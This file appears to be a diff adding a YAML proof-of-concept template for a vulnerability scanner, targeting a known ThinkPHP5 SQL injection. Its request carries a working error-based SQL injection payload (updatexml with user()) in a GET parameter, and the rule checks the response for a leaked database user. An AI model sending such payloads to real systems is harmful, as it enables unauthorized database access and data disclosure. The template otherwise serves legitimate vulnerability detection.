@@ -1,0 +1,12 @@
+name: poc-yaml-thinkphp5-sql
+rules:
+  - method: GET
+    path: /index.php?ids[0,updatexml(0,concat(0xa,user()),0)]=1
+    follow_redirects: false
+    expression: |
+        response.status == 500 && "@".bmatches(response.body)
+detail:
+  vulnType: ThinkPHP5 SQL注入漏洞 && 敏感信息泄露
+  author: supersalted(https://github.com/salted)
+  links:
+    - https://github.com/vulhub/vulhub/blob/master/thinkphp/in-sqlinjection/README.zh-cn.md
